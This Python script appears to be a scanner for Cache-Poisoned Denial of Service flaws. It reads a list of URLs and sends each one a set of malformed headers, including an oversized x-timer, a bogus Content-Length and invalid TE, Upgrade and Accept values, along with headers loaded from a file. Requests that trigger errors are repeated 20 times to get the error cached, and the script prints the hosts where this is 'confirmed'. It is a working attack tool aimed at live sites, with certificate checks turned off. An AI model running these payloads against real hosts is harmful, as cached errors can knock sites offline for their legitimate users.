#! /usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import sys
import random
import traceback
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed

requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)


def check_cached(url, pk, main_status_code, authent):
    behavior = False
    confirmed = False
    try:
        for i in range(0, 20):
            req = s.get(url, headers=pk, verify=False, auth=authent, timeout=20)
        req_verify = s.get(url, verify=False, auth=authent, timeout=20)
        #print(f"{req.status_code} :: {req_verify.status_code}")
        if req.status_code == req_verify.status_code and req.status_code not in [429, 200]:
            behavior = True
            for rh in req.headers:
                if "age" in rh.lower() or "hit" in rh.lower():
                    confirmed = True
        elif req.status_code != req_verify.status_code and req.status_code != 429:
            for rh in req.headers:
                if "age" in rh.lower() or "hit" in rh.lower():
                    behavior = True

        if confirmed:
            print("  \033[31m └── VULNERABILITY CONFIRMED\033[0m | CPDoS: \033[34m{}\033[0m | {} > {} | PAYLOAD: {}".format(url, main_status_code, req.status_code, pk))
            behavior = False
        elif behavior:
            print("  \033[33m └── INTERESTING BEHAVIOR\033[0m | CPDoS: \033[34m{}\033[0m | {} > {} | PAYLOAD: {}".format(url, main_status_code, req.status_code, pk))
    except Exception as e:
        #pass
        print(f"Error : {e}")


def get_error(url, s, main_status_code, authent):

    payload_keys = [
    {"xyz": "1"},
    {"(": "1"},
    {"x-timer": "x"*500},
    {"X-Timer": "5000"},
    {"X-Requested-With": "SomeValue"},
    {"Authorization": "Bearer InvalidToken"},
    {"Accept": "toto"},
    {"Accept-Encoding": "toto"},
    {"Expect": "100-continue"},
    #{"If-None-Match": "*"},
    {"Max-Forwards": "0"},
    {"TE": "toto"},
    {"Connection": "toto"},
    {"Content-Encoding": "deflate"},
    {"Upgrade": "toto"},
    {"Proxy-Authorization": "Basic dXNlcjpwYXNzd29yZA=="},
    {"Via": "1.1 proxy.example.com"},
    {"DNT": "1"},
    {"Content-Disposition": "invalid_value"},
    {"Warning": "199 - Invalid Warning"},
    {"Trailer": "invalid_header"},
    {"Referer": "xy"},
    {"Referer": "xy", "Referer": "x"},
    {"Content-Length":"394616521189"},
    {"TE": "teapot"},
    {"TE": "foo"},
    ]
    for pk in payload_keys:
        try:
            req = s.get(url, headers=pk, verify=False, auth=authent, timeout=20)
            if req.status_code != 200 and main_status_code not in [403, 401] and req.status_code != main_status_code:
                #print(f"[{main_status_code}>{req.status_code}] [{len(main_status_code.headers)}b>{len(req.headers)}b] [{len(main_status_code.content)}b>{len(req.content)}b] {url} :: {pk}")
                check_cached(url, pk, main_status_code, authent)
        except requests.Timeout:
            #print(f"request timeout {url} {p}")
            pass
        except KeyboardInterrupt:
            print("Exiting")
            sys.exit()
        except Exception as e:
            #print(f"Error : {e}")
            pass
    with open("headers.txt") as header_list:
        for h in header_list.read().splitlines():
            try:
                hk = {h: "toto"}
                req = s.get(url, headers=hk, verify=False, auth=authent, timeout=20)
                if req.status_code != 200 and main_status_code not in [403, 401] and req.status_code != main_status_code:
                    #print(f"[{main_status_code}>{req.status_code}] [{len(main_status_code.headers)}b>{len(req.headers)}b] [{len(main_status_code.content)}b>{len(req.content)}b] {url} :: {pk}")
                    check_cached(url, hk, main_status_code, authent)
            except requests.Timeout:
                #print(f"request timeout {url} {p}")
                pass
            except KeyboardInterrupt:
                print("Exiting")
                sys.exit()
            except Exception as e:
                #print(f"Error : {e}")
                pass



if __name__ == '__main__':
    url_file = sys.argv[1]
    s = requests.Session()
    #get_error(url_file, s)
    with open(url_file, "r") as urls:
        urls = urls.read().splitlines()
        for url in urls:
            url = "{}?cb={}".format(url, random.randrange(999))
            try:
                req_main = requests.get(url, verify=False, timeout=10)
                main_status_code = req_main.status_code
                authent = False
                get_error(url, s, main_status_code, authent)
            except KeyboardInterrupt:
                print("Exiting")
                sys.exit()
            except:
                pass
            print(f" {url}", end='\r')